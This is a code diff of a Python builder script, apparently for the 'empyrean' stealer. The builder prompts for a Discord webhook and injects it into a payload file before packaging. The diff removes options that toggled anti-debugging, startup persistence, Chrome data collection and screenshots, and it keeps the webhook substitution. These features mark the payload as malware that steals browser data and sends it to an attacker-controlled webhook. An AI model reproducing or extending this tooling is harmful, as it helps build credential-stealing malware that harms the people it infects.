@@ -29,19 +29,11 @@ def main():
     print(__BANNER__)
     
     webhook = input("{:<27}: ".format("Discord Webhook?"))
-    debug = input("{:<27}: ".format("(y/n) Anti-debug?"))
-    startup = input("{:<27}: ".format("(y/n) Add to startup?"))
-    google = input("{:<27}: ".format("(y/n) Google chrome info?"))
-    screenshot = input("{:<27}: ".format("(y/n) Screenshot?"))
     
     # code = requests.get("https://raw.githubusercontent.com/addi00000/empyrean/main/main.py").text
     with open(file=".\main.py", mode="r", encoding='utf-8') as f: code = f.read()
     
-    code = code.replace('"debug": True,', '"debug": False,') if debug.lower() == "n" else code.replace('"debug": False,', '"debug": True,')
-    code = code.replace('"startup": True,', '"startup": False,') if startup.lower() == "n" else code.replace('"startup": False,', '"startup": True,')
-    code = code.replace('"google": True,', '"google": False,') if google.lower() == "n" else code.replace('"google": False,', '"google": True,')
-    code = code.replace('"screenshot": True,', '"screenshot": False,') if screenshot.lower() == "n" else code.replace('"screenshot": False,', '"screenshot": True,')
-    code = code.replace('"webhook": "WEBHOOK_URL",', f'"webhook": "{webhook}",')
+    code = code.replace("&WEBHOOK_URL&", webhook)
     
     
     imports = [i for i in code.split("\n") if i.startswith("import") or i.startswith("from")]
